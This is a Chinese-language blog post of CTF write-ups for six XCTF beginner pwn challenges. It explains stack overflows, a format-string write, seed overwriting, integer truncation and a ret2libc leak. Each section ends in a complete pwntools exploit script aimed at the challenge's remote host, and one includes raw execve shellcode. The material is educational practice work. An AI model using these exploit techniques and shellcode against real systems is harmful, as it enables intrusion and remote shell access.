---
title: 攻防世界基础pwn
date: 2021-04-22 17:38:10
tags:
	- 攻防世界
	- pwn
		

---



# 攻防世界pwn

​	

## level2

放入虚拟机查看保护

![image-20210408182410326](https://s2.loli.net/2022/03/26/rs14pmzdLwROKfQ.png)

用file 命令查看文件

![image-20210408182434936](https://s2.loli.net/2022/03/26/hLc9gKdUWNRoGBJ.png)

是一个32位可执行文件，拖入对应的IDA查看![image-20220328202953101](https://s2.loli.net/2022/03/28/HeBTEUGIrlC3Pxv.png)

在main函数中看到一个**重要函数**，跟进查看

![image-20210408182657527](https://s2.loli.net/2022/03/26/wfFBCc7jbp6leAo.png)

可以看到这里的大小发生矛盾，会产生溢出，由于本人刚学习pwn，暂时看不出是什么溢出（菜是原罪）

接着就是上脚本了

```
from pwn import * 

r = remote("111.200.241.244",56981)
sysaddr=0x08048320
binshaddr=0x0804A024
payload='a'*(0x88+0x4)+p32(sysaddr)+p32(0)+p32(binshaddr)
r.sendline(payload)
r.interactive()
```

![image-20210408184430999](https://s2.loli.net/2022/03/26/zXcYl9hEVIQ2swH.png)

cat一下flag就出来了

## string

这道题应该是攻防世界pwn题中最难的一道题了吧，拿到题目还是先查看程序的防御机制

![image-20210408202245142](https://s2.loli.net/2022/03/26/isc35UhQrto4xCb.png)

发现除了PIE全开，然后拖入IDA查看

![image-20210408202456265](https://s2.loli.net/2022/03/26/t2Vfe3BuKQS1T9I.png)

找到程序的入口，发现是由三个函数构成的，接着一一查看这三个函数

![image-20210408202534288](https://s2.loli.net/2022/03/26/GTXpcWfLEDSMVBZ.png)

第一个函数说了很多废话，但是耐心看完就是让我们输入east，不然的话程序会直接退出

![image-20210408202630396](https://s2.loli.net/2022/03/26/d7UZJtLm8lIOXby.png)

第二个函数也是，意思就是让我们就输入1不然程序还是会报错，但是在看的过程中其实我并没有发现什么漏洞，上网借鉴大佬的思路后，才发现第二个函数里面有个print函数漏洞

![image-20210408202813111](https://s2.loli.net/2022/03/26/UJKcnL6zV9rxGMS.png)

print函数漏洞造成格式化字符泄露，先接着看第三个函数

![image-20210408203111899](https://s2.loli.net/2022/03/26/yKNUb74Lfjtgv9R.png)

根据大佬的思路就是a1存放的就是v3的地址，就是我们v3申请的内存大小，如果使v3前面字节和后面字节相等，就可以打shellcode，由于我是初学者，脚本也是借鉴大佬的。

```
exp：

from pwn import *
r = remote('111.200.241.244',64805)
r.recvuntil("secret[0] is ") 
addr = int(r.recvuntil("\n")[:-1], 16)
print (addr)
r.recvuntil("What should your character's name be:\n")
r.sendline("aaa")
r.recvuntil("So, where you will go?east or up?:\n")
r.sendline("east")
r.recvuntil("go into there(1), or leave(0)?:\n")
r.sendline("1")
r.recvuntil("'Give me an address'\n")
r.sendline(str(addr))
r.recvuntil("And, you wish is:\n")
payload = 'A' * 85 + "%7$n"
r.sendline(payload)
#shellcode = asm(shellcraft.sh())
shellcode="\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
r.sendline(shellcode)
r.interactive()
```

## guess_num

拖入IDA查看

![image-20210414203115766](https://s2.loli.net/2022/03/26/1R7PcvT5NotdkCB.png)

看的出大致是个猜谜游戏，需要连续对十次

![image-20210414203221728](https://s2.loli.net/2022/03/26/JfZcaDgGzVP7KpB.png)

运行一下程序检验果然如此

回IDA看到了一个主要函数

![image-20210414203635726](https://s2.loli.net/2022/03/26/lAFfS9bVZmHypKx.png)

又查看了里面参数的大小

![image-20210414204159888](https://s2.loli.net/2022/03/26/dL7SscAiwuURKTZ.png)

随机数选取的种子的值在rbp-10h处，我们输入name的buff在rbp-30h处，所以可以通过0x20个数据来将种子覆盖成一个我们自己输入的数

exp：

```
from pwn import *
from ctypes import *
r = remote('111.200.241.244',57019)
payload="a"*0x20+p64(1)
r.recvuntil("name:")
r.sendline(payload)
for i in range(10):
	num = str(cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6").rand()%6 + 1)
	r.recvuntil("number:")
	r.sendline(num)
r.interactive()
```

## int_overflow

![image-20210415163126787](https://s2.loli.net/2022/03/26/amigB1WYPdwG2kb.png)

检查保护机制，发现只启用了**NX(NoeXecute，数据不可执行**)保护机制，因此可以拿来做**栈溢出**攻击。（NX保护开启意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用**rop**这种方法绕过）

拖入IDA查看

![image-20210415163255727](https://s2.loli.net/2022/03/26/GAvVrlLTufJ95bB.png)

先输入1，进入login函数，双击跟进login函数

![image-20210415163337057](https://s2.loli.net/2022/03/26/sKqwPyR2Yumca4v.png)

接受了一个最大长度为409的password，还有一个check_passwd函数检查password

![image-20210415163518381](https://s2.loli.net/2022/03/26/3pENDuWdQbKUwrI.png)

漏洞点就在此，首先程序回获取输入字符串的长度，并存于一个int8类型的变量中，实际上，这个int8变量最多可以存储256大小的字节，如果这个数字为257，那么在内存中查看的话其大小就变成了257-256=1.也就是说我们输入一个长度为256+4~256+8长度之间的字符串，就可以溢出s，这就是rop操作

exp：

```
from pwn import *
r=remote("111.200.241.244",52738)
shell_add=0x0804868b
payload = 'A'*0x14 + 'A'*4 + p32(shell_add) + 'A'*(256+3-0x14-4-4)
r.sendlineafter('Your choice:', '1')
r.sendlineafter('username:', 'aa')
r.sendlineafter('passwd:', payload)
r.interactive()


```

## cgpwn2

![image-20210419172455400](https://s2.loli.net/2022/03/26/KJ3hMEdWw54SXFV.png)

查看checksec ，开启了RELRO和NX保护



![image-20210419172921214](https://s2.loli.net/2022/03/26/FerEzXGALsh54vO.png)

IDA主函数查看到有函数漏洞hello（）

![image-20210419173013790](https://s2.loli.net/2022/03/26/GQDlWB6FxZrtheq.png)

并且有个pwn函数可以调用系统函数，可以看到在hello函数中有一个部分我们用gets函数向栈的s区域读取了字符串，结合gets函数不限制输入字符个数和程序没有开启stack保护两点，我们可以在使用输入时让输入的字符串覆盖栈上hello函数的返回地址，让程序执行完hello函数之后执行我们设计的部分

EXP：

```
from pwn import *
r=remote('111.200.241.244',42533)
sys_addr=0x0804855A //pwn函数中callsystem语句的地址，也是我们构造的假的返回地址
bin=0x804A080    //name区域的地址，我们向name区域输入/bin/sh,然后让这个地址作为system函数的参数，
				//完成system("/bin/sh")
payload='a'*0x26+'aaaa'+p32(sys_addr)+p32(bin)
a=r.recvuntil('e\n')
r.sendline('/bin/sh')
a=r.recvuntil(':\n')
r.sendline(payload)
r.interactive()
```

## level3

使用ida打开之后，函数内部很简单的逻辑。可以看出在vulnerable_fuction函数内部的，rand函数存在漏洞，但是对程序内部进行查找，没有找到相关的system函数，也没有/bin/sh这个字符串。

![image-20210419201957664](https://s2.loli.net/2022/03/26/bMwWRVkPt93mTIr.png)

![image-20210419202004132](https://s2.loli.net/2022/03/26/ZcjBwfbdt38DSPC.png)

为了更好的用户体验和内存CPU的利用率，程序编译时会采用两种表进行辅助，一个为PLT表，一个为GOT表，PLT表可以称为内部函数表，GOT表为全局函数表（也可以说是动态函数表这是个人自称），这两个表是相对应的

PLT表中的每一项对应于GOT表中的每一项。

这里用了一个巧妙的方法，即先通过栈溢出，利用 *write* 函数将其本身在GOT表中的地址泄露出来，减去在 *libc_32.so* 中的偏移，得到基址，紧接着重新进入 *main* 函数，再次通过栈溢出，利用 *system* 函数完成get shell

| first stack |      | second stack |
| ----------- | ---- | ------------ |
| 0x88 * 'a'  |      | 0x88 * 'a'   |
| ebp         |      | ebp          |
| write@plt   |      | system_addr  |
| main_addr   |      | xxxx         |
| 1           |      | bin_sh_addr  |
| write@got   |      |              |
| 4           |      |              |

exp:

```
from pwn import *

context.log_level = 'debug'

conn = remote('111.198.29.45', 49214)
elf = ELF('./level3')
libc = ELF('./libc_32.so.6')

write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = elf.symbols['main']

payload = 'A' * (0x88 + 4) 
payload += p32(write_plt) 
payload += p32(main_addr) 
payload += p32(1) + p32(write_got) + p32(4)

conn.sendlineafter('Input:\n', payload)
write_addr = u32(conn.recv()[:4])

libc_base = write_addr - libc.symbols['write']
print 'libc_base is', libc_base

sys_addr = libc_base + libc.symbols['system']
bin_addr = libc_base + libc.search('/bin/sh').next()

payload = 'A' * (0x88 + 4) 
payload += p32(sys_addr) 
payload += '9527' 
payload += p32(bin_addr)

conn.sendline(payload)
conn.interactive()

conn.close()
```